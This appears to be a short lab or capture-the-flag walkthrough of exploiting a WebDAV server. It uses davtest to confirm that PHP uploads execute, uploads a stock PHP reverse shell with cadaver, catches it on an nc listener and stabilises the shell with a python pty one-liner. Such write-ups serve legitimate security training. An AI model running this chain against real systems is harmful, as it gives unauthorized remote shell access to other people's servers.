***********
davtest:->
***********
davtest is a tool that checks a WebDAV server for what it will let you do — specifically, which file types it allows you to upload and execute (PHP, 
ASP, etc).
It automatically tries uploading test files of various extensions and reports which ones succeed and which get blocked/deleted by the server. 
Purpose: quickly confirm whether a WebDAV misconfiguration is exploitable before wasting time crafting a payload.

>$ davtest -url http://10.48.147.108/webdav -auth username:password
______________________________________________________________________
Output showed PHP uploads were permitted — meaning we could upload a PHP reverse shell and have the server execute it.
so what we will do is cp /usr/share/webshells/php-reverse-shell . in your current working directory then we will use cadaver. Make sure to change ip and port .

*********
cadaver->
*********
cadaver is a command-line WebDAV client — think of it like an FTP client but for WebDAV. It lets you connect to a WebDAV share and run commands like 
put (upload), get (download), ls, delete, etc. Purpose: once davtest confirms PHP execution works, cadaver is the tool actually used to push the 
malicious file onto the server.

>$ cadaver http://10.48.147.108/webdav
______________________________________

>$ put php-reverse-shell.php
______________________________

This uploads php-reverse-shell.php (a PHP reverse shell payload) directly into the WebDAV directory, which is also served over HTTP — so visiting the file’s URL triggers it.

🐚Getting a Shell->
------------------

Started a listener on our attack machine to catch the reverse connection:

>$ nc -lvnp 4444
________________

Browsed to the uploaded file’s URL to trigger execution:

http://10.48.147.108/webdav/php-reverse-shell.php
__________________________________________________

The PHP file is executed now go back to our listener, we got a reverse shell.

Stabilized the TTY for a proper interactive shell:

>$ python3 -c 'import pty; pty.spawn("/bin/bash")'
__________________________________________________


